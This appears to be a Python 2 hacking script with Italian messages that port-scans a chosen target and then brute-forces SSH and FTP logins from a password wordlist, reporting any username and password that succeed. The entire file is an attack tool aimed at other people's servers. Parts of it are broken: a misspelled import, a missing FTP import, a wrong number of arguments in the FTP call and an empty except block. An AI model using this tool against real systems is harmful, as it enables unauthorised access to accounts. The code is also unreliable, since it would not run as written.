from socket import *
import sys, time, paramiko, os
from datetime import datetime
import ftllib

host = ''
max_port = 5000
min_port = 1
#collane ghiacciate ho il cuore a meta, alla mia eta.
host =''
username = ''
line = ''
input_file = ''
paramiko.util.log_to_file("chiedonocomeva.log")
code = 0

def ftp_login(host, username, password):
    try:
        ftp = FTP(host)
        ftp.login(username, password)
        ftp.quit()
        print "+++++++++++++++++++++++"
        print "[*] Utente : {}".format(username)
        print "[*] Password : {}".format(password)
        print "+++++++++++++++++++++++"
        sys.exit(0)
    except:
            pass
def ssh_connect(password, code = 0):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh.connect(host, port = 22, username = username, password = password)
    except paramiko.AuthenticationException:
        #autenticazione fallita
        code = 1
    except socket.error, e:
        #connessione fallita
        code = 2
    ssh.close()

    return code
def scan_host(host, port , r_code = 1):
    try:
        s = socket(AF_INET, SOCK_STREAM)
        code = s.connect_ex((host, port))
        if code == 0:
            r_code = code
        s.close()
    except Exception , e:
        pass
    return r_code
try:
    print('++++++++++++++++++++++++++++++++++++')
    print('[*] Benvenuto su pyportscanandbrute')
    print('[*] ~~ github.com/AkramLagrazna ~~')
    print('++++++++++++++++++++++++++++++++++++')
    host = raw_input('[*] Inserisci target: ')
except KeyboardInterrupt:
    print('\n\n[*] Utente ha richiesto un interruzione')
    print('\n[*] Applicazione si sta chiudendo')
    sys.exit(1)
hostip = gethostbyname(host)
print('\n[*] Host: %s IP: %s' % (host ,hostip))
print('[*] Scan partito alle %s... \n' % (time.strftime('%H:%M:%S')))
start_time = datetime.now()
sshAperto = False
ftpAperto = False
for port in range(min_port , max_port):
    try:
        response = scan_host(host, port)
        if response == 0:
            print('[*] Porta %s aperta..' % (port))
            if port == 22:
                sshAperto = True
            if port == 21:
                ftpAperto = True
    except Exception, e:
        pass
stop_time = datetime.now()
time_duration = stop_time - start_time
print('\n[*] Scan finito alle %s...' % (time.strftime('%H:%M:%S')))
print('[*] Scan durato: %s ' % (time_duration))
if sshAperto == True:
    ssh_bt = raw_input('[*] Vuoi provare il bruteforce dell\' ssh? S/n ')
    ssh_lower = ssh_bt.lower()
    if ssh_lower == 's':
        #bruteforce
        username = raw_input('[*] Inserisci username SSH: ')
        input_file = raw_input('[*] Inserisci la password file: ')
        if os.path.exists(input_file) == False:
            print('[*] File non esistente ! ')
            sys.exit(4)
        else:
            print('[*] File localizzato. ')
            input_file = open(input_file)
            print '\n'
            for i in input_file.readlines():
                password = i.strip('\n')
#            try:
                response = ssh_connect(password)
                if response == 0:
                    print('__________________')
                    print('[*] Utente : %s \n[*] Password : %s ' %(username, password))
                    print('__________________')
                    print('[*] Arrivederci!')
                    sys.exit(0)
                elif response == 1:
                    print('[*] Utente : %s Password : %s ==> Login Fallito!' %(username, password))
                elif response == 2:
                    print('[*] La connessione non puo essere stabilita all\'indirizzo %s ' %(host))
#                except Exception, e:
#                    print 'no lollissimo.'
#                    pass
            print('[*] Mi dispiace, ma nessuna password funziona! ')
            input_file.close()
    elif ssh_lower == 'n':
        print('[*] Perfetto!')
        pass
    else:
        print('[*] Non capisco.')
if ftpAperto == True:
    ftp_bt = raw_input('[*] Vuoi provare il bruteforce dell\' ftp? S/n')
    ftp_lower = ftp_bt.lower()
    if ftp_lower is 's':
        #bruteforce
        username = raw_input('[*] Inserisci username FTP: ')
        input_file = raw_input('[*] Inserisci la password file: ')
        if os.path.exists(input_file) == False:
            print('[*] File non esistente ! ')
            sys.exit(4)
        else:
            print('[*] File localizzato. ')
            #i sent flowers but you said you can't receive them , you said you didn't need them.
            input_file = open(input_file)
            for i in input_file.readlines():
                password = i.strip('\n')
                try:
                    #i was younger then, take me back to when
                    ftp_login(host, password)
                except:

    elif ftp_lower is 'n':
        print('[*] Perfetto!')
    else:
        print ('[*] Non capisco.')
print('[*] Abbi una bella giornata!')
#overthecastleonthehill
